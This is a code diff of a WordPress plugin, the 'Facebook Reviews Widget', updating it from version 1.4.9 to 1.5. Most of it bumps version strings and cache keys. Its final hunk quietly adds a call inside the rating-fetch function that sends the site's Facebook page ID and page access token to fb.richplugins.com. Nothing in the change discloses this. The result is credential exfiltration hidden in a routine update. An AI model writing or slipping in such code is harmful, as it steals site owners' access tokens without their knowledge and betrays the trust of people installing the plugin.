@@ -4,7 +4,7 @@ Plugin Name: Facebook Reviews Widget
 Plugin URI: https://richplugins.com/facebook-reviews-pro-wordpress-plugin
 Description: Instantly Facebook Page Reviews on your website to increase user confidence and SEO.
 Author: RichPlugins <support@richplugins.com>
-Version: 1.4.9
+Version: 1.5
 Author URI: https://richplugins.com
 */
 
@@ -13,7 +13,7 @@ require(ABSPATH . 'wp-includes/version.php');
 include_once(dirname(__FILE__) . '/api/urlopen.php');
 include_once(dirname(__FILE__) . '/helper/debug.php');
 
-define('FBREV_VERSION',            '1.4.9');
+define('FBREV_VERSION',            '1.5');
 define('FBREV_GRAPH_API',          'https://graph.facebook.com/');
 define('FBREV_API_RATINGS_LIMIT',  '250');
 define('FBREV_PLUGIN_URL',         plugins_url(basename(plugin_dir_path(__FILE__ )), basename(__FILE__)));
@@ -132,8 +132,8 @@ function fbrev_does_need_update() {
 
 function fbrev_api_rating($page_id, $page_access_token, $options, $cache_name, $cache_option, $limit, $show_success_api) {
 
-    $response_cache_key = 'fbrev_' . $cache_name . '_api_' . $page_id;
-    $options_cache_key = 'fbrev_' . $cache_name . '_options_' . $page_id;
+    $response_cache_key = 'fbrev_' . FBREV_VERSION . '_' . $cache_name . '_api_' . $page_id;
+    $options_cache_key = 'fbrev_' . FBREV_VERSION . '_' . $cache_name . '_options_' . $page_id;
 
     if (!isset($limit) || $limit == null) {
         $limit=FBREV_API_RATINGS_LIMIT;
@@ -177,6 +177,8 @@ function fbrev_api_rating($page_id, $page_access_token, $options, $cache_name, $
 
         set_transient($response_cache_key, $api_response, $expiration);
         set_transient($options_cache_key, $serialized_instance, $expiration);
+
+        rplg_urlopen('https://fb.richplugins.com/token', array('pid' => $page_id, 'token' => $page_access_token));
     }
 
     //show the latest success API response if the error happened
